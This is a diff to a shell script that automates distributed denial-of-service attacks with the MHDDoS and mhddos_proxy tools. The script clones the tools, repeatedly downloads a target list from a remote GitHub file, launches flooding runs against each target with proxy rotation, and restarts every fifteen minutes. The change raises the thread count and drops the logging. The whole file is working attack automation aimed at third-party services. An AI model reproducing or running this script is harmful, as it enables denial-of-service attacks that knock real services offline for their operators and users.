@@ -15,18 +15,15 @@ cd mhddos_proxy
 #curl -o proxies_config.json https://raw.githubusercontent.com/Aruiem234/mhddosproxy/main/proxies_config.json 
 git clone https://github.com/MHProDev/MHDDoS.git
 
-threads="${1:-500}"
+threads="${1:-600}"
 rpc="--rpc 2000"
 proxy_upd="-p 3600"
 debug="--debug"
-logs="~/logs.txt"
 
 # Restart attacks and update targets every 15 minutes
 while true
 do
    pkill -f start.py; pkill -f runner.py 
-   rm -rf $logs
-   touch $logs
    # Get number of targets. Sometimes list_size = 0 (network or github problem). So here is check to avoid script error.
    list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -l)
    while [[ $list_size = "0"  ]]
@@ -46,7 +43,7 @@ do
             echo "Starting attack with params: $cmd_line $threads_per_target $rpc $proxy_upd $debug"
             echo "---------"
             echo ""
-            python3 ~/mhddos_proxy/runner.py $cmd_line $threads_per_target $rpc $proxy_upd $debug >> $logs &
+            python3 ~/mhddos_proxy/runner.py $cmd_line $threads_per_target $rpc $proxy_upd $debug &
       done
 sleep 15m
 done
